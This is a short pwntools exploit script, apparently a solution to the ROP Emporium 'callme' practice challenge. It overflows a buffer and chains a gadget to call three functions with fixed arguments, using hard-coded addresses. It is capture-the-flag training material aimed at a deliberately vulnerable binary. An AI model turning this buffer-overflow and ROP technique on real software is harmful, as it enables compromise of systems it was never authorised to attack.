from pwn import *

elf = context.binary = ELF("./callme")
p = process()
libc = elf.libc
libc.address = 0x00007ffff7c00000

junk = 40
rdi = p64(elf.sym["usefulGadgets"])
param1 = p64(0xdeadbeefdeadbeef)
rsi = p64(elf.sym["usefulGadgets"] + 1)
param2 = p64(0xcafebabecafebabe)
rdx = p64(elf.sym["usefulGadgets"] + 2)
param3 = p64(0xd00df00dd00df00d)
callme1 = p64(0x00007ffff7c0081a)
callme2 = p64(0x00007ffff7c0092b)
callme3 = p64(0x00007ffff7c00a2d)
payload = b"A" * 40 + rdi + param1 + param2 + param3 + callme1 + rdi +  param1 + param2 + param3 + callme2 + rdi + param1 + param2 + param3 + callme3
write("payload",payload)
p.sendline(payload)
print(p.recvall())